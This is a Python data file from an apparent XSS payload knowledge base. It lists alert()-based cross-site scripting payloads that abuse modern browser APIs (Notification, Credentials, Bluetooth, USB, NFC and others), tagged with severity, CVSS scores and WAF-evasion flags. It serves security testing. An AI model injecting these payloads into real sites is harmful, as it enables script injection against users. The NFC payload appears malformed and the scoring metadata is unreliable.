#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Ultra Deep XSS Payloads - Part 4
Modern browser APIs: Battery, Notifications, Payment, Credentials, Presentation, Speech, Gamepad, MIDI, Bluetooth, USB, Serial, HID, NFC.
"""

from ..models import PayloadEntry


BRS_KB_ULTRA_DEEP_PAYLOADS_PART4 = {
    # ============================================================
    # BATTERY API (DEPRECATED)
    # ============================================================
    "battery-api": PayloadEntry(
        payload="navigator.getBattery?.().then(b=>alert(b.level))",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Battery API (deprecated)",
        tags=["battery", "deprecated"],
        bypasses=["navigator_filters"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # ============================================================
    # NOTIFICATION API
    # ============================================================
    "notification-onclick": PayloadEntry(
        payload="new Notification('x').onclick=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Notification click handler",
        tags=["notification", "onclick"],
        bypasses=["notification_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # PAYMENT REQUEST API
    # ============================================================
    "paymentRequest": PayloadEntry(
        payload="new PaymentRequest([{supportedMethods:'basic-card'}],{total:{amount:{currency:'USD',value:alert(1)||'1'}}}).show()",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="PaymentRequest with side effect",
        tags=["payment", "request"],
        bypasses=["payment_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="low",
    ),
    # ============================================================
    # CREDENTIALS API
    # ============================================================
    "credentials-create": PayloadEntry(
        payload="navigator.credentials.create({password:{id:alert(1)||'x',password:'y'}})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Credentials API create",
        tags=["credentials", "create"],
        bypasses=["credential_filters"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # ============================================================
    # PRESENTATION API
    # ============================================================
    "presentation-request": PayloadEntry(
        payload="new PresentationRequest([alert(1)||'https://example.com'])",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Presentation Request with side effect",
        tags=["presentation", "request"],
        bypasses=["presentation_filters"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # ============================================================
    # SPEECH SYNTHESIS
    # ============================================================
    "speechSynthesis": PayloadEntry(
        payload="speechSynthesis.speak(new SpeechSynthesisUtterance(alert(1)||'x'))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Speech synthesis with side effect",
        tags=["speech", "synthesis"],
        bypasses=["speech_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # GAMEPAD API
    # ============================================================
    "gamepad-event": PayloadEntry(
        payload="ongamepadconnected=e=>alert(e.gamepad.id)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Gamepad connected event",
        tags=["gamepad", "event"],
        bypasses=["gamepad_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "edge"],
        reliability="low",
    ),
    # ============================================================
    # MIDI API
    # ============================================================
    "midi-access": PayloadEntry(
        payload="navigator.requestMIDIAccess?.().then(m=>alert(m))",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="MIDI access request",
        tags=["midi", "access"],
        bypasses=["midi_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="low",
    ),
    # ============================================================
    # BLUETOOTH API
    # ============================================================
    "bluetooth-request": PayloadEntry(
        payload="navigator.bluetooth?.requestDevice({acceptAllDevices:true}).then(d=>alert(d.name))",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Bluetooth device request",
        tags=["bluetooth", "request"],
        bypasses=["bluetooth_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="low",
    ),
    # ============================================================
    # USB API
    # ============================================================
    "usb-request": PayloadEntry(
        payload="navigator.usb?.requestDevice({filters:[]}).then(d=>alert(d))",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="USB device request",
        tags=["usb", "request"],
        bypasses=["usb_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="low",
    ),
    # ============================================================
    # SERIAL API
    # ============================================================
    "serial-request": PayloadEntry(
        payload="navigator.serial?.requestPort().then(p=>alert(p))",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Serial port request",
        tags=["serial", "request"],
        bypasses=["serial_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="low",
    ),
    # ============================================================
    # HID API
    # ============================================================
    "hid-request": PayloadEntry(
        payload="navigator.hid?.requestDevice({filters:[]}).then(d=>alert(d))",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="HID device request",
        tags=["hid", "request"],
        bypasses=["hid_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="low",
    ),
    # ============================================================
    # NFC API
    # ============================================================
    "nfc-scan": PayloadEntry(
        payload="new NDEFReader?.()?.scan().then(()=>alert(1))",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="NFC scan request",
        tags=["nfc", "scan"],
        bypasses=["nfc_filters"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
}
